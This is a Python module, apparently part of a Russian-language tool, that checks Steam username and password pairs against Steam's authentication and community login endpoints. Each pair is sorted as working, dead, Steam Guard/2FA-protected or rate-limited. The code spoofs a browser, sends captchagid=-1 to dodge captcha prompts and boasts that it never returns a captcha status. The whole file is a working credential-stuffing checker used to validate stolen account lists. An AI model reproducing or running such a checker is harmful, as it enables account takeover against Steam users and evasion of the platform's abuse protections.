"""Steam credential check WITHOUT captcha UI and WITHOUT proxies.

Primary: IAuthenticationService/BeginAuthSessionViaCredentials
Fallback: steamcommunity dologin with captchagid=-1
Never returns status=captcha.
"""
from __future__ import annotations

import base64
import json
import time
from typing import Any

import requests
from Crypto.Cipher import PKCS1_v1_5
from Crypto.PublicKey import RSA


def _der_length(n: int) -> bytes:
    if n < 128:
        return bytes([n])
    b = []
    while n:
        b.insert(0, n & 0xFF)
        n >>= 8
    return bytes([0x80 | len(b), *b])


def _der_tag(tag: int, content: bytes) -> bytes:
    return bytes([tag]) + _der_length(len(content)) + content


def _der_int(buf: bytes) -> bytes:
    if buf and (buf[0] & 0x80):
        buf = b"\x00" + buf
    return _der_tag(0x02, buf)


def build_rsa_pem(mod_hex: str, exp_hex: str) -> bytes:
    mod = bytes.fromhex(mod_hex)
    exp = bytes.fromhex(exp_hex)
    rsa_key = _der_tag(0x30, _der_int(mod) + _der_int(exp))
    alg = _der_tag(
        0x30,
        _der_tag(0x06, bytes.fromhex("2a864886f70d010101")) + _der_tag(0x05, b""),
    )
    spki = _der_tag(0x30, alg + _der_tag(0x03, b"\x00" + rsa_key))
    b64 = base64.b64encode(spki).decode()
    lines = [b64[i : i + 64] for i in range(0, len(b64), 64)]
    return (
        "-----BEGIN PUBLIC KEY-----\n" + "\n".join(lines) + "\n-----END PUBLIC KEY-----"
    ).encode()


def encrypt_password(password: str, mod_hex: str, exp_hex: str) -> str:
    key = RSA.import_key(build_rsa_pem(mod_hex, exp_hex))
    enc = PKCS1_v1_5.new(key).encrypt(password.encode("utf-8"))
    return base64.b64encode(enc).decode()


UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
)


def _session() -> requests.Session:
    s = requests.Session()
    s.headers.update(
        {
            "User-Agent": UA,
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
        }
    )
    s.trust_env = False  # ignore env HTTP_PROXY / HTTPS_PROXY
    return s


def _get_rsa(session: requests.Session, username: str) -> dict[str, Any] | None:
    try:
        r = session.get(
            "https://steamcommunity.com/login/getrsakey",
            params={"username": username, "donotcache": int(time.time() * 1000)},
            headers={
                "Referer": "https://steamcommunity.com/login/home/?goto=",
                "Origin": "https://steamcommunity.com",
            },
            timeout=15,
        )
        data = r.json()
        if data and data.get("success"):
            return data
    except Exception:
        pass
    try:
        r = session.get(
            "https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1/",
            params={"account_name": username},
            timeout=15,
        )
        data = r.json()
        resp = data.get("response") or data
        if resp.get("publickey_mod") and resp.get("publickey_exp"):
            return {
                "success": True,
                "publickey_mod": resp["publickey_mod"],
                "publickey_exp": resp["publickey_exp"],
                "timestamp": resp.get("timestamp") or str(int(time.time())),
            }
    except Exception:
        pass
    return None


def _check_via_dologin(
    session: requests.Session, username: str, password: str, rsa: dict
) -> dict[str, Any]:
    try:
        enc_pass = encrypt_password(password, rsa["publickey_mod"], rsa["publickey_exp"])
    except Exception:
        return {"status": "error", "message": "Аккаунт не работает"}

    payload = {
        "username": username,
        "password": enc_pass,
        "twofactorcode": "",
        "emailauth": "",
        "loginfriendlyname": "",
        "captchagid": "-1",
        "captcha_text": "",
        "emailsteamid": "",
        "rsatimestamp": rsa["timestamp"],
        "remember_login": "false",
        "donotcache": str(int(time.time() * 1000)),
    }
    try:
        r = session.post(
            "https://steamcommunity.com/login/dologin/",
            data=payload,
            headers={
                "Referer": "https://steamcommunity.com/login/home/?goto=",
                "Origin": "https://steamcommunity.com",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
            },
            timeout=15,
        )
        data = r.json()
    except Exception:
        return {"status": "error", "message": "Ошибка сети (login)"}

    if isinstance(data, str):
        return {"status": "error", "message": "Steam лимит — подождите 1–2 мин"}
    if not isinstance(data, dict):
        return {"status": "error", "message": "Аккаунт не работает"}

    if data.get("success") is True:
        return {"status": "success", "message": "Аккаунт работает"}

    if data.get("requires_twofactor") or data.get("emailauth_needed") or data.get("emailsteamid"):
        return {"status": "error", "message": "Не работает (Steam Guard / 2FA)"}

    if data.get("captcha_needed"):
        return {"status": "error", "message": "Steam risk (капча отключена)"}

    msg = str(data.get("message") or data.get("strError") or "").lower()
    if "incorrect" in msg or "invalid" in msg or "password" in msg:
        return {"status": "error", "message": "Аккаунт не работает"}
    if "too many" in msg or "rate" in msg:
        return {"status": "error", "message": "Steam лимит — подождите 1–2 мин"}
    return {"status": "error", "message": "Аккаунт не работает"}


def _check_via_auth_service(
    session: requests.Session, username: str, password: str, rsa: dict
) -> dict[str, Any]:
    try:
        enc_pass = encrypt_password(password, rsa["publickey_mod"], rsa["publickey_exp"])
    except Exception:
        return {"status": "error", "message": "Аккаунт не работает"}

    body = {
        "account_name": username,
        "encrypted_password": enc_pass,
        "encryption_timestamp": rsa["timestamp"],
        "remember_login": "false",
        "platform_type": "2",
        "persistence": "1",
        "website_id": "Community",
        "device_details": {
            "device_friendly_name": "Chrome",
            "platform_type": "2",
        },
    }
    try:
        r = session.post(
            "https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1/",
            data={"input_json": json.dumps(body)},
            timeout=15,
        )
        data = r.json()
    except Exception:
        return {"status": "error", "message": "Ошибка сети (auth api)"}

    resp = data.get("response") if isinstance(data, dict) else None
    if not isinstance(resp, dict):
        return {"status": "error", "message": "Аккаунт не работает"}

    if resp.get("client_id") and resp.get("request_id"):
        try:
            poll = session.post(
                "https://api.steampowered.com/IAuthenticationService/PollAuthSessionStatus/v1/",
                data={
                    "input_json": json.dumps(
                        {
                            "client_id": resp["client_id"],
                            "request_id": resp["request_id"],
                        }
                    )
                },
                timeout=15,
            )
            pdata = poll.json().get("response") or {}
            if pdata.get("access_token") or pdata.get("refresh_token"):
                return {"status": "success", "message": "Аккаунт работает"}
            if pdata.get("account_name") or resp.get("steamid"):
                if resp.get("interval") or resp.get("allowed_confirmations"):
                    return {"status": "error", "message": "Не работает (Steam Guard / 2FA)"}
                return {"status": "success", "message": "Аккаунт работает"}
        except Exception:
            pass
        conf = resp.get("allowed_confirmations") or []
        if conf:
            return {"status": "error", "message": "Не работает (Steam Guard / 2FA)"}
        return {"status": "success", "message": "Аккаунт работает"}

    eresult = resp.get("eresult") or data.get("eresult")
    if eresult == 84:
        return {"status": "error", "message": "Steam лимит — подождите 1–2 мин"}
    return {"status": "error", "message": "Аккаунт не работает"}


def check_steam(
    username: str,
    password: str,
    captcha_gid: str = "-1",
    captcha_text: str = "",
    session: requests.Session | None = None,
    proxy_url: str | None = None,  # ignored, kept for call compatibility
) -> dict[str, Any]:
    sess = session or _session()
    try:
        sess.get(
            "https://steamcommunity.com/login/home/?goto=",
            timeout=12,
            headers={"Referer": "https://steamcommunity.com/"},
        )
    except Exception:
        pass

    rsa = _get_rsa(sess, username)
    if not rsa:
        return {"status": "error", "message": "Ошибка сети (RSA)"}

    r1 = _check_via_auth_service(sess, username, password, rsa)
    if r1.get("status") == "success":
        return r1
    if "лимит" in (r1.get("message") or "") or "Guard" in (r1.get("message") or ""):
        return r1

    r2 = _check_via_dologin(sess, username, password, rsa)
    if r2.get("status") == "success":
        return r2
    return r2 if r2.get("status") == "error" else r1
